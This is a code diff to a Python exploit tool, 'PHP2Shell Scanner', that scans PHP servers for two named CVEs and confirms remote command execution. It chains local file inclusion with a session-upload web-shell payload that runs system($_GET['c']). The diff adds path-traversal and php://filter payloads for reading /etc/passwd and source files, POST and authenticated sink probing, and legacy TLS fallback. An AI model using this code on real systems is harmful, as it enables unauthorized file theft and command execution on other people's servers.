@@ -2,7 +2,9 @@
 from __future__ import annotations
 
 import argparse
+import base64
 import csv
+import hashlib
 import json
 import os
 import re
@@ -15,7 +17,7 @@ import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, quote
 
-UA = "php2shell-scan/3.0 (authorized asset assessment)"
+UA = "php2shell-scan/3.1 (authorized asset assessment)"
 
 PATCHED = {"8.2": (8, 2, 35), "8.3": (8, 3, 36), "8.4": (8, 4, 27), "8.5": (8, 5, 12)}
 EOL_BRANCHES = {"5.4", "5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0", "8.1"}
@@ -57,7 +59,20 @@ VENDOR_LABEL = {
 }
 
 SESSION_CANDIDATES = ("/tmp", "/var/lib/php/sessions", "/var/lib/php5", "/var/lib/php/session")
-LFI_PARAMS = ("page", "file", "path", "include", "view", "lang", "template", "p", "load")
+LFI_PARAMS = ("page", "file", "path", "include", "view", "lang", "template", "p", "load",
+              "inc", "content", "url", "doc", "name", "mod", "action", "cat", "tpl",
+              "theme", "dir", "root", "src")
+LFI_VALUES = (
+    ("/etc/passwd", "plain"),
+    ("../../../../etc/passwd", "plain"),
+    ("....//....//....//etc/passwd", "plain"),
+    ("php://filter/convert.base64-encode/resource=index.php", "b64"),
+    ("php://filter/convert.base64-encode/resource=../index.php", "b64"),
+)
+SINK_FILES = ("index.php", "page.php", "view.php", "read.php", "file.php",
+              "download.php", "product.php", "article.php", "show.php")
+AUTH_HINTS = ("login", "sign-in", "signin", "auth", "sso", "session/new")
+LFI_PACE = 0.12
 
 
 class Palette:
@@ -109,14 +124,82 @@ def log(msg):
     print(msg, flush=True)
 
 
-def _connect(host, port, tls=False, timeout=10):
-    raw = socket.create_connection((host, port), timeout=timeout)
-    if tls:
-        ctx = ssl.create_default_context()
+TLS = {"sni": None, "host_header": None, "verify": False, "legacy": True}
+_TLS_PROFILE = {}
+
+
+def _tls_ctx(profile="modern"):
+    ctx = ssl.create_default_context()
+    if not TLS["verify"]:
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        return ctx.wrap_socket(raw, server_hostname=host)
-    return raw
+    if profile in ("relaxed", "legacy"):
+        try:
+            ctx.minimum_version = ssl.TLSVersion.TLSv1
+        except (ValueError, ssl.SSLError):
+            pass
+        level = "1" if profile == "relaxed" else "0"
+        try:
+            ctx.set_ciphers(f"DEFAULT:@SECLEVEL={level}" if profile == "relaxed"
+                            else f"ALL:@SECLEVEL={level}")
+        except ssl.SSLError:
+            pass
+    return ctx
+
+
+def _sni_name(host):
+    if TLS["sni"]:
+        return TLS["sni"]
+    return None if _is_ip(host) else host
+
+
+def _is_ip(host):
+    return bool(re.fullmatch(r"[0-9.]{7,15}", host or "")) or ":" in (host or "")
+
+
+def net_error(exc, timeout=None):
+    if isinstance(exc, ssl.SSLCertVerificationError):
+        return "tls_cert", f"certificate verification failed: {exc.verify_message}"
+    if isinstance(exc, ssl.SSLError):
+        return "tls_handshake", f"TLS handshake failed: {getattr(exc, 'reason', None) or exc}"
+    if isinstance(exc, socket.gaierror):
+        return "dns", f"DNS lookup failed: {exc}"
+    if isinstance(exc, socket.timeout):
+        return "tcp_timeout", f"TCP timeout{f' after {timeout}s' if timeout else ''}"
+    if isinstance(exc, ConnectionRefusedError):
+        return "tcp_refused", "connection refused"
+    if isinstance(exc, ConnectionResetError):
+        return "tcp_reset", "connection reset by peer"
+    return "net", str(exc)
+
+
+def _connect(host, port, tls=False, timeout=10):
+    raw = socket.create_connection((host, port), timeout=timeout)
+    if not tls:
+        return raw
+    key = (host, port)
+    order = ["modern"] if not TLS["legacy"] else ["modern", "relaxed", "legacy"]
+    cached = _TLS_PROFILE.get(key)
+    if cached in ("relaxed", "legacy"):
+        order = [cached] + [p for p in order if p != cached]
+    profiles = tuple(order)
+    last = None
+    for name in profiles:
+        try:
+            sock = _tls_ctx(name).wrap_socket(raw, server_hostname=_sni_name(host))
+            _TLS_PROFILE[key] = name
+            return sock
+        except ssl.SSLCertVerificationError:
+            raise
+        except ssl.SSLError as exc:
+            last = exc
+            try:
+                raw.close()
+            except OSError:
+                pass
+            raw = socket.create_connection((host, port), timeout=timeout)
+    _TLS_PROFILE[key] = "failed"
+    raise last
 
 
 def _dechunk(body):
@@ -172,7 +255,7 @@ def _parse(raw):
 
 def http_req(host, port, method, path, tls=False, headers=None, body=None,
              timeout=10, max_resp=262144):
-    hdrs = {"Host": host, "Connection": "close", "User-Agent": UA,
+    hdrs = {"Host": TLS["host_header"] or host, "Connection": "close", "User-Agent": UA,
             "Accept": "*/*", "Accept-Encoding": "identity"}
     if headers:
         hdrs.update(headers)
@@ -184,12 +267,16 @@ def http_req(host, port, method, path, tls=False, headers=None, body=None,
     try:
         sock = _connect(host, port, tls=tls, timeout=timeout)
     except (socket.timeout, OSError, ssl.SSLError) as exc:
-        return {"status": 0, "headers": {}, "body": b"", "truncated": False, "error": str(exc)}
+        code, text = net_error(exc, timeout)
+        return {"status": 0, "headers": {}, "body": b"", "truncated": False,
+                "error": text, "error_code": code}
     try:
         sock.sendall(req.encode("latin-1") + (body or b""))
         raw = _read_response(sock, max_resp=max_resp)
     except (socket.timeout, OSError, ssl.SSLError) as exc:
-        return {"status": 0, "headers": {}, "body": b"", "truncated": False, "error": str(exc)}
+        code, text = net_error(exc, timeout)
+        return {"status": 0, "headers": {}, "body": b"", "truncated": False,
+                "error": text, "error_code": code}
     finally:
         try:
             sock.close()
@@ -209,6 +296,8 @@ def follow(host, port, tls, path, timeout=10, max_hops=3):
     resp = None
     for _ in range(max_hops + 1):
         resp = http_req(cur[0], cur[1], "GET", cur[3], tls=cur[2], timeout=timeout)
+        if resp.get("error"):
+            break
         if resp["error"] or resp["status"] not in (301, 302, 303, 307, 308):
             break
         loc = resp["headers"].get("location", "")
@@ -464,21 +553,157 @@ class CmdRunner:
         self.session_file = None
         self.payload = "<?php echo 'P2S_S';system($_GET['c']);echo 'P2S_E';?>"
 
+    def hdrs(self):
+        h = {}
+        if getattr(self.args, "cookie", None):
+            h["Cookie"] = self.args.cookie
+        for raw in (getattr(self.args, "header", None) or []):
+            if ":" in raw:
+                k, v = raw.split(":", 1)
+                h[k.strip()] = v.strip()
+        return h
+
+    def _req(self, method, path, body=None):
+        extra = self.hdrs()
+        if body is not None:
+            extra["Content-Type"] = "application/x-www-form-urlencoded"
+        return http_req(self.host, self.port, method, path, tls=self.tls, headers=extra,
+                        body=body, timeout=self.args.timeout)
+
+    @staticmethod
+    def _sig(r):
+        b = r.get("body") or b""
+        return (r.get("status"), len(b), hashlib.sha1(b).hexdigest()[:16])
+
+    @staticmethod
+    def _auth_redirect(r):
+        if r.get("status") not in (301, 302, 303, 307, 308):
+            return None
+        loc = (r.get("headers") or {}).get("location", "") or ""
+        low = loc.lower()
+        return loc if any(h in low for h in AUTH_HINTS) else None
+
+    @staticmethod
+    def _redirected(r):
+        if r.get("status") not in (301, 302, 303, 307, 308):
+            return False
+        return bool((r.get("headers") or {}).get("location"))
+
+    @staticmethod
+    def _lfi_hit(r, kind):
+        b = r.get("body") or b""
+        if not b:
+            return False
+        if kind == "plain":
+            return b"root:x:0:0" in b or b"root:*:0:0" in b
+        for tok in re.findall(rb"[A-Za-z0-9+/]{120,}={0,2}", b):
+            try:
+                dec = base64.b64decode(tok, validate=True)
+            except Exception:
+                continue
+            if b"<?php" in dec[:600]:
+                return True
+        return False
+
+    def _sink_bases(self):
+        bases, seen = [self.path], {self.path}
+        idx = "/index.php" if self.path == "/" else self.path.rstrip("/") + "/index.php"
+        if idx not in seen:
+            bases.append(idx)
+            seen.add(idx)
+        root = self._req("GET", self.path)
+        body = (root.get("body") or b"").decode("latin-1", "replace")
+        for m in re.finditer(r'(?:href|action|data-url)="([^"]{1,200})"', body):
+            u = m.group(1)
+            if not u or u.startswith(("http://", "https://", "//", "mailto:", "tel:",
+                                     "#", "javascript:")):
+                continue
+            p = u.split("?")[0]
+            if not p.endswith(".php"):
+                continue
+            p = p if p.startswith("/") else "/" + p
+            if p not in seen:
+                seen.add(p)
+                bases.append(p)
+            if len(bases) >= 4:
+                break
+        if len(bases) < 3 or (root.get("status") or 0) >= 400:
+            for fname in SINK_FILES:
+                if len(bases) >= 4:
+                    break
+                p = "/" + fname if self.path == "/" else self.path.rstrip("/") + "/" + fname
+                if p not in seen:
+                    seen.add(p)
+                    bases.append(p)
+        return bases[:4]
+
+    def _probe(self, base, param, method, probe, budget):
+        if budget["n"] <= 0:
+            return None
+        budget["n"] -= 1
+        time.sleep(LFI_PACE)
+        if method == "GET":
+            sep = "&" if "?" in base else "?"
+            return self._req("GET", f"{base}{sep}{param}={quote(probe, safe='')}")
+        return self._req("POST", base, f"{param}={quote(probe, safe='')}".encode())
+
     def probe_lfi(self):
-        bases = [self.path]
-        if self.path == "/":
-            bases.append("/index.php")
+        info = {"bases": 0, "requests": 0, "live_params": [], "auth_wall": False,
+                "redirect": None, "sink": None, "budget_exhausted": False,
+                "ignored_queries": False, "uniform_reject": False}
+        bases = self._sink_bases()
+        info["bases"] = len(bases)
+        params = (self.args.lfi_param,) if self.args.lfi_param else LFI_PARAMS
+        budget = {"n": self.args.sink_budget}
+        marker = "p2s" + uuid.uuid4().hex[:8]
         for base in bases:
-            for param in ((self.args.lfi_param,) if self.args.lfi_param else LFI_PARAMS):
-                for probe in ("/etc/passwd", "../../../../etc/passwd"):
-                    r = http_req(self.host, self.port, "GET", f"{base}?{param}={probe}",
-                                 tls=self.tls, timeout=self.args.timeout)
+            base_resp = self._req("GET", base)
+            base_sig = self._sig(base_resp) if base_resp else None
+            for method in ("GET", "POST"):
+                repeats = {}
+                for param in params:
+                    r = self._probe(base, param, method, marker, budget)
+                    if r is None:
+                        info["budget_exhausted"] = True
+                        break
+                    info["requests"] += 1
                     if r.get("error"):
                         continue
-                    if b"root:x:0:0" in r["body"] or b"root:*:0:0" in r["body"]:
-                        self.lfi = (base, param)
-                        return self.lfi
-        return None
+                    loc = self._auth_redirect(r)
+                    if loc:
+                        info["auth_wall"] = True
+                        info["redirect"] = loc
+                        break
+                    sig = self._sig(r)
+                    repeats[sig] = repeats.get(sig, 0) + 1
+                    if repeats[sig] >= 4 and self._redirected(r):
+                        info["uniform_reject"] = True
+                        break
+                    live = (base_sig is None or sig != base_sig) and not self._redirected(r)
+                    status_ok = (r.get("status") or 0) < 400
+                    if not (live and status_ok):
+                        continue
+                    info["live_params"].append(f"{method}:{param}")
+                    if len(info["live_params"]) > 6:
+                        continue
+                    for probe, kind in LFI_VALUES:
+                        rr = self._probe(base, param, method, probe, budget)
+                        if rr is None:
+                            info["budget_exhausted"] = True
+                            break
+                        info["requests"] += 1
+                        if rr.get("error"):
+                            continue
+                        if self._lfi_hit(rr, kind):
+                            self.lfi = (base, param, method)
+                            info["sink"] = {"path": base, "param": param, "method": method,
+                                            "kind": kind}
+                            return info
+            if info["auth_wall"] or info["budget_exhausted"]:
+                break
+        if not info["live_params"] and not info["auth_wall"]:
+            info["ignored_queries"] = True
+        return info
 
     def inject(self):
         body = mp_body(self.boundary.encode(), [
@@ -501,10 +726,13 @@ class CmdRunner:
     def trigger(self, cmd):
         if not self.lfi or not self.session_file:
             return None
-        base, param = self.lfi
-        r = http_req(self.host, self.port, "GET",
-                     f"{base}?{param}={quote(self.session_file)}&c={quote(cmd)}",
-                     tls=self.tls, timeout=self.args.timeout)
+        base, param, method = self.lfi
+        if method == "GET":
+            r = self._req("GET", f"{base}?{param}={quote(self.session_file, safe='')}"
+                                 f"&c={quote(cmd, safe='')}")
+        else:
+            r = self._req("POST", f"{base}?c={quote(cmd, safe='')}",
+                          f"{param}={quote(self.session_file, safe='')}".encode())
         if r.get("error"):
             return {"ok": False, "error": r["error"], "status": 0}
         body = r["body"].decode("latin-1", "replace")
@@ -555,13 +783,33 @@ class CmdRunner:
     def run(self):
         ui = self.ui
         ui.section("Exploit chain · Chain A (session.upload_progress + LFI)")
-        found = self.probe_lfi()
+        info = self.probe_lfi()
+        found = self.lfi
         if not found:
-            ui.note("No LFI sink found; Chain A cannot be applied.", Palette.ORG)
-            ui.note("--cmd only works on targets with an include/require sink.", Palette.GRY)
+            if info.get("auth_wall"):
+                ui.note(f"Sink candidates sit behind a login wall (redirect: {info['redirect']}).",
+                        Palette.ORG)
+                ui.note("Pass --cookie with an authenticated session and rerun.", Palette.GRY)
+                ui.end_section()
+                return 1, {"result": "SINK_BEHIND_AUTH", "redirect": info.get("redirect"),
+                           "probe": info}
+            if info.get("ignored_queries"):
+                ui.note("App ignores every probed query/body parameter on known paths.",
+                        Palette.ORG)
+                ui.note("No parameter-driven include sink on this surface.", Palette.GRY)
+            elif info.get("uniform_reject"):
+                ui.note("Every probed parameter is bounced to an error/redirect page.",
+                        Palette.ORG)
+                ui.note("The router rejects unknown input before any include is reached.",
+                        Palette.GRY)
+            else:
+                ui.note("No LFI sink found; Chain A cannot be applied.", Palette.ORG)
+                ui.note("--cmd only works on targets with an include/require sink.", Palette.GRY)
+            ui.note(f"probe: {info['bases']} path(s), {info['requests']} request(s), "
+                    f"{len(info['live_params'])} live param(s)", Palette.GRY)
             ui.end_section()
-            return 1, {"result": "NO_LFI_SINK"}
-        ui.note(f"LFI: {found[0]}?{found[1]}=<file>", Palette.GRN)
+            return 1, {"result": "NO_LFI_SINK", "probe": info}
+        ui.note(f"LFI: {found[0]} · {found[1]} ({found[2]}) = <file>", Palette.GRN)
         ok, why = self.inject()
         if not ok:
             ui.note(f"injection failed: {why}", Palette.RED)
@@ -589,7 +837,7 @@ class CmdRunner:
             self.shell()
         self.close()
         return 0, {"result": "RCE_CONFIRMED", "session_file": self.session_file,
-                   "lfi": f"{found[0]}?{found[1]}=", "sid": self.sid,
+                   "lfi": f"{found[0]}?{found[1]}=", "sink_method": found[2], "sid": self.sid,
                    "cmd": self.args.cmd, "output": result["output"]}
 
 
@@ -598,7 +846,7 @@ def scan_one(url, args):
            "version_source": None, "version_vulnerable": None, "version_patched": None,
            "sapi": None, "http_status": None, "upload_progress": False,
            "session_fixation": False, "waf": None, "detail": "", "error": None,
-           "redirects": []}
+           "error_code": None, "tls_profile": None, "sni_sent": None, "redirects": []}
     host, port, tls, path = parse_target(url)
     f = follow(host, port, tls, path, args.timeout)
     r = f["resp"] or {}
@@ -608,10 +856,13 @@ def scan_one(url, args):
         r = f["resp"] or {}
     if not r or r.get("error"):
         rec["verdict"] = "ERROR"
+        rec["error_code"] = (r or {}).get("error_code") or "net"
         rec["error"] = f"connection failed ({(r or {}).get('error') or 'unknown'})"
         rec["detail"] = rec["error"]
         return rec
     host, port, tls, path = f["host"], f["port"], f["tls"], f["path"]
+    rec["tls_profile"] = _TLS_PROFILE.get((host, port)) if tls else None
+    rec["sni_sent"] = bool(_sni_name(host)) if tls else None
     rec["final_url"] = ("https://" if tls else "http://") + f"{host}:{port}{path}"
     rec["redirects"] = f["redirects"]
     rec["http_status"] = r["status"]
@@ -753,14 +1004,15 @@ def write_outputs(recs, args):
             w = csv.writer(fh)
             w.writerow(["target", "final_url", "verdict", "version", "version_source",
                         "sapi", "upload_progress", "session_fixation", "waf_vendor",
-                        "waf_status", "http_status", "detail"])
+                        "waf_status", "http_status", "detail", "error_code", "tls_profile"])
             for r in recs:
                 waf = r.get("waf") or {}
                 w.writerow([r["target"], r["final_url"], r["verdict"], r.get("version") or "",
                             r.get("version_source") or "", r.get("sapi") or "",
                             r["upload_progress"], r["session_fixation"],
                             waf.get("vendor") or "", waf.get("status") or "",
-                            r.get("http_status") or "", r.get("detail") or r.get("error") or ""])
+                            r.get("http_status") or "", r.get("detail") or r.get("error") or "",
+                            r.get("error_code") or "", r.get("tls_profile") or ""])
     if args.json_out:
         with open(args.json_out, "w", encoding="utf-8") as fh:
             json.dump(recs, fh, indent=2, ensure_ascii=False)
@@ -781,6 +1033,16 @@ def build_parser():
     p.add_argument("--shell", action="store_true")
     p.add_argument("--lfi-param")
     p.add_argument("--session-path")
+    p.add_argument("--cookie", help="raw Cookie header for authenticated sinks")
+    p.add_argument("--header", action="append", help="extra header, repeatable")
+    p.add_argument("--sink-budget", type=int, default=320,
+                   help="max requests spent on sink discovery (default 320)")
+    p.add_argument("--sni", help="SNI name to send (needed when scanning a vhost by IP)")
+    p.add_argument("--host-header", help="override the Host header")
+    p.add_argument("--tls-verify", action="store_true",
+                   help="enforce certificate validation (off by default; labs use self-signed)")
+    p.add_argument("--no-tls-fallback", action="store_true",
+                   help="do not retry legacy TLS 1.0/1.1 handshakes")
     return p
 
 
@@ -789,15 +1051,24 @@ def main():
     if not args.target and not args.targets_file:
         build_parser().print_help()
         return 2
+    TLS["sni"] = args.sni
+    TLS["host_header"] = args.host_header
+    TLS["verify"] = bool(args.tls_verify)
+    TLS["legacy"] = not args.no_tls_fallback
     color = (not args.no_color) and os.getenv("NO_COLOR") is None
     ui = UI(color=color, anim=not args.no_anim)
     targets = load_targets(args)
-    ui.banner("PHP2Shell Scanner v3.0",
+    ui.banner("PHP2Shell Scanner v3.1",
               "CVE-2026-109618 / CVE-2026-109619 · WAF-aware · Chain A verification")
     ui.info("Targets", f"{len(targets)}")
     ui.info("Threads", args.threads)
     ui.info("Timeout", f"{args.timeout:g}s")
     ui.info("Mode", "active command (--cmd)" if args.cmd else "passive scan")
+    if args.sni:
+        ui.info("SNI", args.sni)
+    if args.host_header:
+        ui.info("Host", args.host_header)
+    ui.info("TLS verify", "on" if args.tls_verify else "off (CERT_NONE)")
     t0 = time.time()
 
     if args.cmd and len(targets) == 1:
@@ -855,6 +1126,10 @@ def main():
                     detail += f"  ·  {rec['waf']['evidence']}"
                 if detail:
                     ui.emit(ui.paint(f"       └ {detail}", Palette.DIM))
+                if rec.get("tls_profile"):
+                    ui.emit(ui.paint(f"       └ tls: {rec['tls_profile']} · "
+                                     f"sni: {'yes' if rec.get('sni_sent') else 'no'}",
+                                     Palette.DIM))
     ui.finish()
     order = {k: i for i, k in enumerate(["VULNERABLE", "LIKELY_VULNERABLE", "SUSPECT",
                                          "WAF_BLOCKED", "ENGINE_PATCHED", "UNKNOWN", "ERROR"])}
